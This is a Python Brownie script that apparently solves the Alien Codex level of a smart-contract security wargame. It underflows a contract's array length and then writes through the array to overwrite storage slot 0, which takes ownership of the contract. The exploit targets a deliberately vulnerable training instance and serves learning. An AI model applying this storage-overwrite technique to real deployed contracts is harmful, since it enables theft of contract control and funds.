from brownie import (
    network,
    accounts,
    config,
    interface,
    Contract,
)
from scripts.helpful_scripts import (
    get_account,
    get_new_instance,
    submit_instance,
    get_web3
)
from web3 import Web3


def main():
    player = get_account()
    instance_address = get_new_instance(level_id=19, player=player)
    alien_codex_contract = interface.IAlienCodex(instance_address)
    w3 = get_web3()

    array_start = Web3.toInt(Web3.solidityKeccak(['uint256'], [1]))
    slot_zero_replacement = Web3.toBytes(hexstr=f"0x01{str(player)[2:]}")

    print_slots(instance_address, w3, start=0)

    tx = alien_codex_contract.make_contact({"from": player})
    tx.wait(1)
    tx = alien_codex_contract.retract({"from": player})
    tx.wait(1)
    tx = alien_codex_contract.revise(2 ** 256 - array_start, slot_zero_replacement, {"from": player})
    tx.wait(1)

    print_slots(instance_address, w3, start=0)

    submit_instance(instance_address, player)


def print_slots(instance_address, w3, start=0, num_slots=3):
    for slot_id in range(start, start + num_slots):
        print(f'Slot {slot_id}')
        print(Web3.toHex(w3.eth.get_storage_at(instance_address, slot_id)))
        print()